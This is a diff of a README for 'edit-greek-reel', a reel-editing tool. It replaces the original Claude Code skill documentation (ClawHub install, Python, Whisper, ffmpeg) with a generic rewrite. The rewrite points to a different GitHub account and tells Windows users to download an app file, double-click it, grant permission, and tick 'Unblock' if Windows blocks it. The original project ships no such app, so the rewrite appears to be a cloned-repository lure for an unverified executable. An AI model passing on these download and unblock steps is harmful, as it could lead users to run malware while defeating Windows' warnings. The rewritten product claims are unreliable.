@@ -1,156 +1,202 @@
-# Greek Reel Video Editor — Artemis Codes
+# 🎬 edit-greek-reel - Turn raw clips into polished reels
 
-[![ClawHub](https://img.shields.io/badge/ClawHub-edit--greek--reel-blue)](https://clawhub.ai/artemisln/edit-greek-reel)
+[![Download edit-greek-reel](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Eferzarr888/edit-greek-reel)
 
-A Claude Code custom skill that turns raw talking-head videos into polished Instagram Reels / TikToks with karaoke-style subtitles. Supports any language — just point it at your video and go.
+## 🖥️ What this app does
 
-**Install instantly via ClawHub:**
-```bash
-clawhub install edit-greek-reel
-```
+edit-greek-reel helps you turn a talking-head video into a short reel for Instagram, TikTok, or Shorts.
 
-## What it does
+It can:
+- cut out long pauses
+- keep the last version when you repeat a sentence
+- add word-by-word subtitles
+- add small zoom effects on key moments
+- place images or logos above your head
+- add sound effects on selected words
+- crop your video to 9:16 for mobile screens
 
-- **Transcribes** your video using OpenAI Whisper (with automatic proofreading)
-- **Trims silence** and dead air between sentences
-- **Removes retakes** — keeps only your last take when you repeat yourself
-- **Burns karaoke-style subtitles** — word-by-word highlight in Manrope Bold
-- **Adds subtle zoom effects** on key moments (1.08-1.10x, not dizzy-inducing)
-- **Overlays images/logos** above your head when you mention tools or brands
-- **Mixes sound effects** — whoosh, cash register, pop, etc. on key words
-- **Crops to 9:16** (object-cover, never stretches your video)
+It is made for people who want a clean final video without doing each step by hand.
 
-## Before / After
+## 📥 Download and run on Windows
 
-| | Before | After |
-|---|---|---|
-| Duration | 90s raw footage | ~38s tight edit |
-| Subtitles | None | Karaoke-style, sentence case |
-| Silence | 50+ seconds of gaps | Cut to zero |
-| Effects | None | Zooms, SFX, image overlays |
+Use this link to visit the download page and get the app:
 
-## Installation
+[![Open edit-greek-reel on GitHub](https://img.shields.io/badge/Open%20Download%20Page-grey?style=for-the-badge)](https://github.com/Eferzarr888/edit-greek-reel)
 
-### Prerequisites
+### Steps
+1. Open the link above in your browser.
+2. Download the latest release or app file from the page.
+3. If the download comes as a `.zip` file, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. Double-click the app file to start it.
+6. If Windows asks for permission, choose **Yes**.
+7. Follow the on-screen steps to load your video and create the reel.
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) CLI installed
-- Python 3.10+
-- ffmpeg (`brew install ffmpeg` on macOS, `choco install ffmpeg` on Windows)
-- [Manrope font](https://fonts.google.com/specimen/Manrope) installed (Bold weight required)
+If the page offers more than one file, choose the Windows version.
 
-### Option 1: ClawHub (recommended)
+## 🔧 Before you start
 
-```bash
-npm i -g clawhub
-clawhub install edit-greek-reel
-```
+For smooth use on Windows, make sure you have:
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- A few GB of free storage space
+- A video file in a common format, such as MP4 or MOV
+- Headphones or speakers if you want to check audio
 
-> **Note:** ClawHub may not include the bundled SFX audio files. The skill will automatically download them from this repository on first run if they're missing.
+A newer computer will process video faster. Larger videos can take more time.
 
-### Option 2: Manual
+## 🎞️ How it works
 
-```bash
-git clone https://github.com/artemisln/edit-greek-reel.git
-cp -r edit-greek-reel ~/.claude/skills/edit-greek-reel
-```
+The app follows a simple flow:
+1. You load a video.
+2. The app finds speech in the clip.
+3. It removes silence and repeated takes.
+4. It adds subtitles and timing.
+5. It applies zoom, image, and sound effects where needed.
+6. It exports a finished vertical reel.
 
-### Python dependencies
+You do not need to edit each frame by hand.
 
-```bash
-pip install openai-whisper Pillow cairosvg
-```
+## ✏️ Best results
 
-> **Note:** The Whisper medium model (~1.5 GB) will be downloaded automatically on first use. This may take a few minutes depending on your connection.
+For clear output:
+- speak close to the microphone
+- keep the room quiet
+- use a well-lit video
+- avoid cutting off your own words
+- record in one main take when you can
 
-## Usage
+The app works with any language, so you can use Greek or other languages too.
 
-In Claude Code, run:
+## 🧩 What you can expect in the output
 
-```
-/edit-greek-reel ~/path/to/your/raw_video.MOV
-```
+Your finished reel may include:
+- centered vertical framing
+- clean subtitle timing
+- bold karaoke-style word highlights
+- smooth cuts between sentences
+- small zoom-ins for emphasis
+- brand images or logos near your face
+- sound cues that match key words
 
-### Options
+The goal is to keep the video easy to watch on a phone screen.
 
-```
-/edit-greek-reel ~/video.MOV --lang en              # Set language (en, el, es, fr, de, etc.)
-/edit-greek-reel ~/video.MOV --crop-top 20          # Crop 20% from the top
-/edit-greek-reel ~/video.MOV --no-images            # Skip image overlays
-/edit-greek-reel ~/video.MOV --manual-text "..."    # Use your own script text instead of Whisper
-```
+## 📂 Input files
 
-If `--lang` is not specified, the skill will ask which language your video is in before transcribing.
+You can use:
+- MP4
+- MOV
+- M4V
+- WebM
 
-### Adding custom SFX
+Use the original file from your camera or phone when possible. That gives the app more detail to work with.
 
-Drop `.mp3` files into an `audios/` folder next to your video. The skill will auto-detect and trim leading silence from them.
+## 🧠 Subtitle style
 
-The skill ships with 6 bundled SFX:
-- `trimmed_whoosh.mp3` — transitions, reveals
-- `trimmed_cash.mp3` — money/price mentions
-- `trimmed_fah.mp3` — emphasis, strong statements
-- `trimmed_click.mp3` — tool mentions
-- `trimmed_bubble_pop.mp3` — light reveals
-- `trimmed_riser.mp3` — builds, anticipation
+The app uses karaoke-style subtitles with word-level highlight. This helps viewers follow the speech even with the sound off.
 
-### Adding image overlays
+The subtitle style is built to stay readable on small screens:
+- bold text
+- clear spacing
+- strong contrast
+- one line at a time when possible
 
-Create an `images/` folder next to your video and add logos/screenshots/memes as `.png`, `.webp`, or `.svg` files. Name them after what they represent (e.g., `cursor.png`, `github_copilot.png`). The skill will overlay them when you mention the corresponding tool.
+## 🔊 Audio and effects
 
-## How it works
+The app can add simple sound effects at key words or actions. These may include:
+- whoosh
+- pop
+- cash register
+- tap
+- hit
 
-### 3-Pass Pipeline
+Use these with care. A few well-placed effects usually work better than too many.
 
-1. **Pass 1: Trim + Crop + Scale** (ffmpeg)
-   - Cuts silence gaps and retakes
-   - Crops to 9:16 ratio (object-cover style)
-   - Scales to 1080x1920
+## 📐 Crop and framing
 
-2. **Pass 2: Subtitles + Zoom + Images** (Python/Pillow, frame-by-frame)
-   - Renders karaoke subtitles with word-by-word highlighting
-   - Applies smooth zoom effects with ease-in/ease-out
-   - Composites image overlays with pop-in/pop-out animation
+The app crops your video to 9:16 for mobile viewing. It keeps the main subject in frame and avoids stretching the image.
 
-3. **Pass 3: Mix SFX** (ffmpeg)
-   - Layers sound effects at precise timestamps
-   - Never repeats the same SFX in one video
+This helps your video fit platforms that use vertical video:
+- Instagram Reels
+- TikTok
+- YouTube Shorts
 
-### Subtitle Style
+## 🗂️ Folder layout
 
-- Font: Manrope Bold, 72px
-- Inactive words: White with black outline
-- Active word: Gold/Yellow highlight
-- No background pill — outline only
-- 2 words per line (always fits on screen)
-- Sentence case (never ALL CAPS)
+After download and extract, you may see files like:
+- the app file
+- a settings file
+- a models folder
+- an output folder
+- a README file
 
-## File Structure
+Leave the folders in place unless the app tells you to move them.
 
-```
-edit-greek-reel/
-  skill.md          # The Claude Code skill definition
-  audios/           # Bundled sound effects
-    trimmed_whoosh.mp3
-    trimmed_cash.mp3
-    trimmed_fah.mp3
-    trimmed_click.mp3
-    trimmed_bubble_pop.mp3
-    trimmed_riser.mp3
-  README.md         # This file
-```
+## 🛠️ If the app does not open
 
-## Tips
+If Windows blocks the file:
+- right-click the app file
+- choose **Properties**
+- look for **Unblock** and check it if present
+- click **Apply**
+- try again
 
-- Record in **portrait mode** (9:16) for best results
-- Speak naturally — the skill handles retakes and pauses
-- If Whisper gets a word wrong, the skill will ask you before proceeding
-- For best subtitle timing, speak clearly with brief pauses between sentences
-- Add tool logos to `images/` if you're reviewing or mentioning specific tools
+If the app closes right away:
+- make sure you extracted the files first
+- check that your video file is not damaged
+- try a smaller test video
 
-## Credits
+If the video export is slow:
+- close other apps
+- free up disk space
+- use a shorter clip for testing
 
-Built by [Artemis Codes](https://instagram.com/artemis.codes) using Claude Code.
+## 📋 Simple use case
 
-## License
+A basic workflow looks like this:
+1. Record yourself speaking.
+2. Open edit-greek-reel.
+3. Load the video.
+4. Let the app clean the pauses and repeat lines.
+5. Review the subtitles and effects.
+6. Export the final reel.
 
-MIT — use it however you want.
+This gives you a short video ready for social media posts
+
+## 🔍 Good video habits
+
+To get cleaner results:
+- face the camera
+- keep your hands visible when needed
+- pause between thoughts
+- avoid loud background noise
+- speak in short sentences
+
+These habits help the app detect speech and timing with more accuracy.
+
+## 💾 Saving your work
+
+The app usually saves the exported reel in an output folder or in the same folder as your source video.
+
+If you plan to make more edits:
+- keep the source video
+- keep the exported file
+- use clear file names
+- store project folders in one place
+
+## 🧭 Need the download page again?
+
+Visit the main repository page here:
+
+[https://github.com/Eferzarr888/edit-greek-reel](https://github.com/Eferzarr888/edit-greek-reel)
+
+## 🧾 File names you may see
+
+You may see names related to:
+- the main app
+- subtitle tools
+- speech transcription
+- export files
+- preview clips
+
+These files work together to process your video from start to finish
